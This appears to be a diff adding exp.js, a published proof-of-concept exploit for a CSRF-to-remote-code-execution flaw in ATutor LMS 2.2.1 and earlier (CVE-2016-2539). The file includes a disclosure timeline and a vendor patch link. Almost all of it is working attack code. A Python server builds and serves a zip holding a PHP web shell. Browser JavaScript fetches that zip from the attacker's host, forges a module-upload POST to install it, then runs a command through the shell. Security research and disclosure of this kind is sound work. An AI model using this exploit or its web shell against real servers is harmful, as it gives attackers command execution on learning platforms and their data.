@@ -1,0 +1,138 @@
+/* exp.js
+
+ATutor LMS <= 2.2.1 install_modules.php CSRF Remote Code Execution
+by mr_me
+
+Notes:
+``````
+- Discovered for @ipn_mx students advanced php vuln/dev class
+- Tested on the latest FireFox 44.0.2 release build
+- This poc simply uploads a zip file as pwn/si.php with a "<?php system($_GET['cmd']); ?>" in it
+- You will need to set the Access-Control-Allow-Origin header to allow the target to pull zips
+- Use this with your favorite XSS attack
+- Student proof, aka bullet proof
+
+Timeline:
+`````````
+23/02/2016 - notified vendor via info[at]atutor[dot]ca
+24/02/2016 - requested CVE and assigned CVE-2016-2539
+24/02/2016 - vendor replied stating they are investigating the issue
+05/03/2016 - vendor patches the issue (https://github.com/atutor/ATutor/commit/bfc6c80c6c217c5515172f3cc949e13dfa1a92ac)
+06/03/2016 - coordinated public release
+
+Example: 
+````````
+mr_me@jupiter:~$ cat poc.py 
+#!/usr/bin/python
+
+import sys
+import zipfile
+import BaseHTTPServer
+from cStringIO import StringIO
+from SimpleHTTPServer import SimpleHTTPRequestHandler
+
+if len(sys.argv) < 3:
+    print "Usage: %s <lport> <target>" % sys.argv[0]
+    print "eg: %s 8000 172.16.69.128" % sys.argv[0]
+    sys.exit(1)
+
+def _build_zip():
+    """
+    builds the zip file
+    """
+    f = StringIO()
+    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
+    z.writestr('pwn/si.php', "<?php system($_GET['cmd']); ?>")
+    z.close()
+    handle = open('pwn.zip','wb')
+    handle.write(f.getvalue())
+    handle.close
+
+class CORSRequestHandler (SimpleHTTPRequestHandler):
+    def end_headers (self):
+        self.send_header('Access-Control-Allow-Origin', 'http://%s' % sys.argv[2])
+        SimpleHTTPRequestHandler.end_headers(self)
+
+if __name__ == '__main__':
+    _build_zip()
+    BaseHTTPServer.test(CORSRequestHandler, BaseHTTPServer.HTTPServer)
+
+mr_me@jupiter:~$ ./poc.py 8000 172.16.69.128
+Serving HTTP on 0.0.0.0 port 8000 ...
+172.16.69.1 - - [23/Feb/2016 14:04:07] "GET /exp.js HTTP/1.1" 200 -
+172.16.69.1 - - [23/Feb/2016 14:04:07] "GET /pwn.zip HTTP/1.1" 200 -
+
+~ de Mexico con amor,
+
+*/
+
+var get_hostname = function(href) {
+    var l = document.createElement("a");
+    l.href = href;
+    return l.hostname + ":" + l.port;
+};
+
+function trolololol(url, file_data, filename) {
+   var file_size = file_data.length,
+   boundary = "828116593165207937691721278",
+   xhr = new XMLHttpRequest();
+
+   // latest ff doesnt have sendAsBinary(), so we redefine it
+   if(!xhr.sendAsBinary){
+      xhr.sendAsBinary = function(datastr) {
+          function byteValue(x) {
+              return x.charCodeAt(0) & 0xff;
+          }
+          var ords = Array.prototype.map.call(datastr, byteValue);
+          var ui8a = new Uint8Array(ords);
+          this.send(ui8a.buffer);
+      }
+   }
+   
+   // the callback after this stage is done...
+   xhr.onreadystatechange = function() {
+       if (xhr.readyState == XMLHttpRequest.DONE) {
+           xhr = new XMLHttpRequest();
+           // change this if you change the zip
+           xhr.open("GET", "/ATutor/mods/pwn/si.php?cmd=id", true);
+           xhr.send();
+       }
+   }
+
+   xhr.open("POST", url, true);
+   // simulate a file MIME POST request.
+   xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
+   xhr.setRequestHeader("Content-Length", file_size);
+   var body = "--" + boundary + "\r\n";
+   body += 'Content-Disposition: form-data; name="modulefile"; filename="' + filename + '"\r\n';
+   body += "Content-Type: archive/zip\r\n\r\n";
+   body += file_data + "\r\n";
+   body += "--" + boundary + "\r\n";
+   body += 'Content-Disposition: form-data; name="install_upload"\r\n\r\n';
+   body += "junk\r\n";
+   body += "--" + boundary;
+   xhr.sendAsBinary(body);
+   return true;
+}
+
+function pwn(){
+    var xhr = new XMLHttpRequest();
+    // et phone home
+    var home = get_hostname(document.scripts[0].src);
+    // get our own zip file
+    xhr.open('GET', 'http://' + home + '/pwn.zip', true);
+    xhr.responseType = 'blob';
+    xhr.onload = function(e) {
+        if (this.status == 200) {
+            // use the FileReader class to get the raw binary
+            var reader = new window.FileReader();
+            reader.readAsBinaryString(new Blob([this.response], {type: 'application/zip'})); 
+            reader.onloadend = function() {
+                trolololol("/ATutor/mods/_core/modules/install_modules.php", reader.result, "pwn.zip");
+            }
+        }
+    };
+    xhr.send();
+}
+
+pwn();
